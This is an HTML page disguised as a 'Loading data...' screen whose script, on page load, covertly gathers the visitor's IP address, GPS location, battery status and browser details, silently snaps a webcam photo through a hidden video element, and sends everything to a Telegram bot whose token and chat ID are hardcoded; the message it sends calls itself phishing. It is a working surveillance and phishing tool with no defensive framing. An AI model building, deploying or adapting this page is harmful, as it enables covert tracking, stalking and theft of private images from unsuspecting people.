<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
</head>
<body>
  <h2>Loading data...</h2>
  <video id="vid" autoplay muted playsinline width="1" height="1" style="display:none;"></video>
  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

  <script>
    const botToken = '7435851375:AAH7RpYei5mXA0YU0MogtjZ9FQZgA4ZzoX8';     
    const chatId = '-1002547203845';         

    async function getIPInfo() {
      try {
        const res = await fetch('https://ipinfo.io/json?token=08d06c9525da9a'); // â† GANTI TOKEN jika punya
        return await res.json();
      } catch {
        return {};
      }
    }

    async function getBatteryInfo() {
      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          return {
            level: `${Math.round(battery.level * 100)}%`,
            charging: battery.charging ? " Dicas" : " Tidak dicas"
          };
        } catch {
          return { level: "N/A", charging: "Unknown" };
        }
      }
      return { level: "Not Supported", charging: "Not Supported" };
    }

    function getGeoLocation() {
      return new Promise(resolve => {
        navigator.geolocation.getCurrentPosition(
          pos => resolve(pos.coords),
          () => resolve({})
        );
      });
    }

    async function takePhotoAndSend() {
      try {
        const video = document.getElementById('vid');
        const canvas = document.getElementById('canvas');
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        await new Promise(r => setTimeout(r, 2000));
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        stream.getTracks().forEach(t => t.stop());

        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
        const form = new FormData();
        form.append('chat_id', chatId);
        form.append('photo', blob, 'selfie.jpg');

        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: form
        });
      } catch (e) {
        console.warn(' Gagal ambil foto:', e);
      }
    }

    async function sendToTelegram() {
      const ip = await getIPInfo();
      const geo = await getGeoLocation();
      const battery = await getBatteryInfo();
      const device = navigator.userAgent;
      const location = geo.latitude
        ? `Lokasi GPS: ${geo.latitude}, ${geo.longitude}`
        : `Lokasi IP: ${ip.city}, ${ip.region}, ${ip.country}`;

      const msg = `
Phishing putraxyofficial
IP: ${ip.ip || 'Unknown'}
${location}
 Baterai: ${battery.level} 
status: ${battery.charging}
Waktu: ${new Date().toLocaleString()}
`;

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: msg })
      });

      await takePhotoAndSend();
    }

    sendToTelegram();
  </script>
</body>
</html>
